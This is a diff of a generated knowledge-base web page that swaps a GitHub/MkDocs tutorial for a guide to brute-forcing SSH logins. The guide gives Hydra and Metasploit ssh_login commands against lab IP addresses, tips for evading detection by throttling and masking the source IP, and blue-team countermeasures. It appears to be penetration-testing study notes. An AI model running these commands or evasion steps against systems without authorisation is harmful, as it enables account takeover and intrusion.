@@ -9,8 +9,10 @@
       
       
       
-        <link rel="prev" href="../create/">
+        <link rel="prev" href="../bashguide/">
       
+      
+        <link rel="next" href="../burpspray/">
       
       
       <link rel="icon" href="../assets/images/favicon.png">
@@ -18,7 +20,7 @@
     
     
       
-        <title>Github create & update - My Knowledge Base</title>
+        <title>Bruteforce Attacks - My Knowledge Base</title>
       
     
     
@@ -68,7 +70,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#managing-mkdocs-with-github" class="md-skip">
+        <a href="#bruteforce-attacks-guide" class="md-skip">
           Skip to content
         </a>
       
@@ -104,7 +106,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Github create & update
+              Bruteforce Attacks
             
           </span>
         </div>
@@ -236,10 +238,31 @@
       
   
   
+    
   
   
-    <li class="md-nav__item">
-      <a href="../bruteforce/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    Bruteforce Attacks
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         
   
   <span class="md-ellipsis">
@@ -249,6 +272,188 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#introduction" class="md-nav__link">
+    <span class="md-ellipsis">
+      🔹 Introduction
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#bruteforcing-ssh-with-hydra" class="md-nav__link">
+    <span class="md-ellipsis">
+      🔹 Bruteforcing SSH with Hydra
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🔹 Bruteforcing SSH with Hydra">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#basic-ssh-bruteforce-attack" class="md-nav__link">
+    <span class="md-ellipsis">
+      Basic SSH Bruteforce Attack
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#breakdown-of-the-command" class="md-nav__link">
+    <span class="md-ellipsis">
+      Breakdown of the Command:
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#user-bruteforcing" class="md-nav__link">
+    <span class="md-ellipsis">
+      User Bruteforcing
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#bruteforcing-ssh-with-metasploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      🔹 Bruteforcing SSH with Metasploit
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🔹 Bruteforcing SSH with Metasploit">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-launch-msfconsole" class="md-nav__link">
+    <span class="md-ellipsis">
+      1️⃣ Launch MSFConsole
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-find-the-ssh-bruteforce-module" class="md-nav__link">
+    <span class="md-ellipsis">
+      2️⃣ Find the SSH Bruteforce Module
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-load-the-ssh-login-module" class="md-nav__link">
+    <span class="md-ellipsis">
+      3️⃣ Load the SSH Login Module
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-set-required-options" class="md-nav__link">
+    <span class="md-ellipsis">
+      4️⃣ Set Required Options
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#5-adjust-settings-for-speed-visibility" class="md-nav__link">
+    <span class="md-ellipsis">
+      5️⃣ Adjust Settings for Speed &amp; Visibility
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#6-run-the-attack" class="md-nav__link">
+    <span class="md-ellipsis">
+      6️⃣ Run the Attack
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#additional-considerations" class="md-nav__link">
+    <span class="md-ellipsis">
+      🔹 Additional Considerations
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🔹 Additional Considerations">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#detection-evasion-tips" class="md-nav__link">
+    <span class="md-ellipsis">
+      Detection &amp; Evasion Tips:
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#blue-team-countermeasures" class="md-nav__link">
+    <span class="md-ellipsis">
+      Blue Team Countermeasures:
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#conclusion" class="md-nav__link">
+    <span class="md-ellipsis">
+      🔹 Conclusion
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -551,19 +756,17 @@
       
   
   
-    
   
   
-  
     
     
     
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_18" checked>
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_18" >
         
           
           <label class="md-nav__link" for="__nav_18" id="__nav_18_label" tabindex="0">
@@ -578,7 +781,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_18_label" aria-expanded="true">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_18_label" aria-expanded="false">
           <label class="md-nav__title" for="__nav_18">
             <span class="md-nav__icon md-icon"></span>
             MkDocs
@@ -655,31 +858,10 @@
                 
   
   
-    
   
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-        
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          
-  
-  <span class="md-ellipsis">
-    Github create & update
-    
-  </span>
-  
-
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../github/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -689,95 +871,6 @@
   
 
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
-  
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      Table of contents
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#introduction" class="md-nav__link">
-    <span class="md-ellipsis">
-      Introduction
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#creating-a-new-github-repository" class="md-nav__link">
-    <span class="md-ellipsis">
-      🔹 Creating a New GitHub Repository
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="🔹 Creating a New GitHub Repository">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#cloning-the-repository" class="md-nav__link">
-    <span class="md-ellipsis">
-      Cloning the Repository
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#updating-mkdocs-and-pushing-to-github" class="md-nav__link">
-    <span class="md-ellipsis">
-      🔹 Updating MkDocs and Pushing to GitHub
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#configuring-github-pages" class="md-nav__link">
-    <span class="md-ellipsis">
-      🔹 Configuring GitHub Pages
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#best-practices" class="md-nav__link">
-    <span class="md-ellipsis">
-      🔹 Best Practices
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#conclusion" class="md-nav__link">
-    <span class="md-ellipsis">
-      Conclusion
-    </span>
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -819,26 +912,44 @@
         <li class="md-nav__item">
   <a href="#introduction" class="md-nav__link">
     <span class="md-ellipsis">
-      Introduction
+      🔹 Introduction
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#creating-a-new-github-repository" class="md-nav__link">
+  <a href="#bruteforcing-ssh-with-hydra" class="md-nav__link">
     <span class="md-ellipsis">
-      🔹 Creating a New GitHub Repository
+      🔹 Bruteforcing SSH with Hydra
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="🔹 Creating a New GitHub Repository">
+    <nav class="md-nav" aria-label="🔹 Bruteforcing SSH with Hydra">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#cloning-the-repository" class="md-nav__link">
+  <a href="#basic-ssh-bruteforce-attack" class="md-nav__link">
     <span class="md-ellipsis">
-      Cloning the Repository
+      Basic SSH Bruteforce Attack
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#breakdown-of-the-command" class="md-nav__link">
+    <span class="md-ellipsis">
+      Breakdown of the Command:
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#user-bruteforcing" class="md-nav__link">
+    <span class="md-ellipsis">
+      User Bruteforcing
     </span>
   </a>
   
@@ -850,36 +961,111 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#updating-mkdocs-and-pushing-to-github" class="md-nav__link">
+  <a href="#bruteforcing-ssh-with-metasploit" class="md-nav__link">
     <span class="md-ellipsis">
-      🔹 Updating MkDocs and Pushing to GitHub
+      🔹 Bruteforcing SSH with Metasploit
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🔹 Bruteforcing SSH with Metasploit">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-launch-msfconsole" class="md-nav__link">
+    <span class="md-ellipsis">
+      1️⃣ Launch MSFConsole
     </span>
   </a>
   
 </li>
-      
-        <li class="md-nav__item">
-  <a href="#configuring-github-pages" class="md-nav__link">
+        
+          <li class="md-nav__item">
+  <a href="#2-find-the-ssh-bruteforce-module" class="md-nav__link">
     <span class="md-ellipsis">
-      🔹 Configuring GitHub Pages
+      2️⃣ Find the SSH Bruteforce Module
     </span>
   </a>
   
 </li>
-      
-        <li class="md-nav__item">
-  <a href="#best-practices" class="md-nav__link">
+        
+          <li class="md-nav__item">
+  <a href="#3-load-the-ssh-login-module" class="md-nav__link">
     <span class="md-ellipsis">
-      🔹 Best Practices
+      3️⃣ Load the SSH Login Module
     </span>
   </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-set-required-options" class="md-nav__link">
+    <span class="md-ellipsis">
+      4️⃣ Set Required Options
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#5-adjust-settings-for-speed-visibility" class="md-nav__link">
+    <span class="md-ellipsis">
+      5️⃣ Adjust Settings for Speed &amp; Visibility
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#6-run-the-attack" class="md-nav__link">
+    <span class="md-ellipsis">
+      6️⃣ Run the Attack
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#additional-considerations" class="md-nav__link">
+    <span class="md-ellipsis">
+      🔹 Additional Considerations
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🔹 Additional Considerations">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#detection-evasion-tips" class="md-nav__link">
+    <span class="md-ellipsis">
+      Detection &amp; Evasion Tips:
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#blue-team-countermeasures" class="md-nav__link">
+    <span class="md-ellipsis">
+      Blue Team Countermeasures:
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
   
 </li>
       
         <li class="md-nav__item">
   <a href="#conclusion" class="md-nav__link">
     <span class="md-ellipsis">
-      Conclusion
+      🔹 Conclusion
     </span>
   </a>
   
@@ -901,75 +1087,94 @@
 
 
 
-<h1 id="managing-mkdocs-with-github">Managing MkDocs with GitHub</h1>
-<h2 id="introduction">Introduction</h2>
-<p>Using <strong>GitHub</strong> for version control and deployment is an essential practice when managing MkDocs projects. This guide covers how to <strong>create a new repository</strong>, update documentation, and deploy it to <strong>GitHub Pages</strong>.</p>
+<h1 id="bruteforce-attacks-guide">Bruteforce Attacks Guide</h1>
+<h2 id="introduction">🔹 Introduction</h2>
+<p>Bruteforce attacks involve systematically trying multiple usernames and passwords to gain access to a target system. This technique is useful for <strong>testing password strength</strong>, <strong>identifying weak/default credentials</strong>, and <strong>evaluating blue team detection capabilities</strong>.</p>
+<p>⚠️ <strong>Warning:</strong> Bruteforce attacks against SSH are <strong>loud</strong> and can be easily detected by defensive teams.</p>
 <hr />
-<h2 id="creating-a-new-github-repository">🔹 Creating a New GitHub Repository</h2>
-<ol>
-<li><strong>Go to GitHub</strong> and log in.</li>
-<li><strong>Click on</strong> <code>+</code> (top-right) → <code>New repository</code>.</li>
-<li><strong>Enter repository details</strong>:</li>
-<li>Repository name: <code>my-mkdocs-site</code></li>
-<li>Description (optional): "Documentation for my project"</li>
-<li>Choose <strong>Public</strong> or <strong>Private</strong>.</li>
-<li>Check <strong>Add a README</strong> (optional).</li>
-<li><strong>Click</strong> <code>Create repository</code>.</li>
-</ol>
-<h3 id="cloning-the-repository">Cloning the Repository</h3>
-<p>After creating the repository, clone it to your local machine:</p>
-<pre><code class="language-bash">git clone https://github.com/your-username/my-mkdocs-site.git
-cd my-mkdocs-site
+<h2 id="bruteforcing-ssh-with-hydra">🔹 Bruteforcing SSH with Hydra</h2>
+<p>Hydra is a <strong>fast and flexible password brute-force tool</strong> that supports multiple protocols, including SSH.</p>
+<h3 id="basic-ssh-bruteforce-attack"><strong>Basic SSH Bruteforce Attack</strong></h3>
+<pre><code class="language-bash">hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.13.143:22 -t 4 -V
 </code></pre>
-<hr />
-<h2 id="updating-mkdocs-and-pushing-to-github">🔹 Updating MkDocs and Pushing to GitHub</h2>
-<p>When making changes to MkDocs documentation, follow these steps:</p>
-<ol>
-<li><strong>Stage all changes</strong>:
-   <code>bash
-   git add .</code></li>
-<li><strong>Commit the changes</strong>:
-   <code>bash
-   git commit -m "Added my new page"</code></li>
-<li><strong>Push to GitHub</strong>:
-   <code>bash
-   git push origin main</code></li>
-<li><strong>Deploy the site to GitHub Pages</strong>:
-   <code>bash
-   mkdocs gh-deploy</code></li>
-</ol>
-<pre><code>mkdocs build --clean
-git add .
-git commit -m &quot;comment&quot;
-git push origin main
-mkdocs gh-deploy
-</code></pre>
-<p>This will build and deploy your MkDocs site to <strong>GitHub Pages</strong>.</p>
-<hr />
-<h2 id="configuring-github-pages">🔹 Configuring GitHub Pages</h2>
-<p>Ensure that GitHub Pages is enabled for your repository:</p>
-<ol>
-<li><strong>Go to your repository on GitHub</strong>.</li>
-<li>Navigate to <strong>Settings &gt; Pages</strong>.</li>
-<li>Under <strong>Branch</strong>, select <code>gh-pages</code>.</li>
-<li>Click <strong>Save</strong>.</li>
-<li>Your site will be available at:
-   <code>https://your-username.github.io/my-mkdocs-site/</code></li>
-</ol>
-<hr />
-<h2 id="best-practices">🔹 Best Practices</h2>
+<h3 id="breakdown-of-the-command"><strong>Breakdown of the Command:</strong></h3>
 <ul>
-<li>Always <strong>commit meaningful messages</strong> (<code>git commit -m "Updated navigation"</code>).</li>
-<li>Regularly <strong>pull updates</strong> from the repository before making changes:
-  <code>bash
-  git pull origin main</code></li>
-<li>Check <strong>Git status</strong> to review changes before committing:
-  <code>bash
-  git status</code></li>
+<li><strong><code>hydra</code></strong> → Launches the Hydra tool.</li>
+<li><strong><code>-l root</code></strong> → Specifies the username (lowercase <code>-l</code> means single user).</li>
+<li><strong><code>-P /usr/share/wordlists/metasploit/unix_passwords.txt</code></strong> → Uses a wordlist to try multiple passwords.</li>
+<li><strong><code>ssh://192.168.13.143:22</code></strong> → Defines the target SSH service and port.</li>
+<li><strong><code>-t 4</code></strong> → Uses <strong>4 parallel attack threads</strong> (lower numbers = stealthier, higher = noisier but faster).</li>
+<li><strong><code>-V</code></strong> → Enables verbose mode (shows each attempt in real time).</li>
+</ul>
+<h3 id="user-bruteforcing"><strong>User Bruteforcing</strong></h3>
+<p>If we want to test <strong>multiple usernames</strong>, we use an uppercase <code>-L</code>:</p>
+<pre><code class="language-bash">hydra -L users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.13.143:22 -t 4 -V
+</code></pre>
+<ul>
+<li><strong><code>-L users.txt</code></strong> → Uses a <strong>list of usernames</strong> instead of a single one.</li>
 </ul>
 <hr />
-<h2 id="conclusion">Conclusion</h2>
-<p>Using GitHub for MkDocs makes it easy to manage documentation changes and deploy updates. By following these steps, you can keep your project well-organized and version-controlled.</p>
+<h2 id="bruteforcing-ssh-with-metasploit">🔹 Bruteforcing SSH with Metasploit</h2>
+<p>Metasploit has a built-in SSH brute-force module for automated attacks.</p>
+<h3 id="1-launch-msfconsole"><strong>1️⃣ Launch MSFConsole</strong></h3>
+<pre><code class="language-bash">msfconsole
+</code></pre>
+<h3 id="2-find-the-ssh-bruteforce-module"><strong>2️⃣ Find the SSH Bruteforce Module</strong></h3>
+<pre><code class="language-bash">search ssh
+</code></pre>
+<p>Look for:</p>
+<pre><code class="language-bash">auxiliary/scanner/ssh/ssh_login
+</code></pre>
+<h3 id="3-load-the-ssh-login-module"><strong>3️⃣ Load the SSH Login Module</strong></h3>
+<pre><code class="language-bash">use auxiliary/scanner/ssh/ssh_login
+</code></pre>
+<h3 id="4-set-required-options"><strong>4️⃣ Set Required Options</strong></h3>
+<pre><code class="language-bash">options
+set username root
+set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt
+set rhosts 192.168.57.137
+</code></pre>
+<ul>
+<li><strong><code>set username root</code></strong> → Specifies the user.</li>
+<li><strong><code>set pass_file</code></strong> → Defines the password wordlist.</li>
+<li><strong><code>set rhosts</code></strong> → Specifies the target IP.</li>
+</ul>
+<h3 id="5-adjust-settings-for-speed-visibility"><strong>5️⃣ Adjust Settings for Speed &amp; Visibility</strong></h3>
+<pre><code class="language-bash">set threads 10
+</code></pre>
+<ul>
+<li><strong>Low threads (1-5)</strong> → <strong>Stealthy but slow</strong>.</li>
+<li><strong>Medium threads (5-10)</strong> → <strong>Balanced attack speed</strong>.</li>
+<li><strong>High threads (10-20)</strong> → <strong>Fast but easily detected</strong>.</li>
+</ul>
+<pre><code class="language-bash">set verbose true
+</code></pre>
+<ul>
+<li><strong>Shows real-time progress</strong> in the terminal.</li>
+</ul>
+<h3 id="6-run-the-attack"><strong>6️⃣ Run the Attack</strong></h3>
+<pre><code class="language-bash">run
+</code></pre>
+<p>Metasploit will start attempting logins. If successful, it will display <strong>valid credentials</strong>.</p>
+<hr />
+<h2 id="additional-considerations">🔹 Additional Considerations</h2>
+<h3 id="detection-evasion-tips"><strong>Detection &amp; Evasion Tips:</strong></h3>
+<ul>
+<li><strong>Reduce threads (<code>-t 1</code> or <code>-t 2</code>)</strong> to slow down attacks and avoid detection.</li>
+<li><strong>Use VPNs or proxies</strong> to mask your IP.</li>
+<li><strong>Try different ports</strong> (if SSH is running on a non-standard port, e.g., <code>2222</code>).</li>
+<li><strong>Monitor logs (<code>/var/log/auth.log</code>)</strong> to see how attacks are logged.</li>
+</ul>
+<h3 id="blue-team-countermeasures"><strong>Blue Team Countermeasures:</strong></h3>
+<ul>
+<li><strong>Fail2Ban</strong>: Blocks IPs after multiple failed login attempts.</li>
+<li><strong>SSH Key Authentication</strong>: Disables password-based logins.</li>
+<li><strong>Rate Limiting</strong>: Restricts SSH login attempts.</li>
+<li><strong>Moving SSH to a non-standard port</strong> (e.g., <code>2222</code>) reduces automated attacks.</li>
+</ul>
+<hr />
+<h2 id="conclusion">🔹 Conclusion</h2>
+<p>Bruteforce attacks are <strong>noisy</strong> and should only be used for <strong>testing password security</strong> in ethical hacking engagements. By leveraging <strong>Hydra and Metasploit</strong>, security professionals can assess the <strong>strength of credentials</strong> and identify <strong>vulnerable SSH services</strong>.</p>
 
 
 
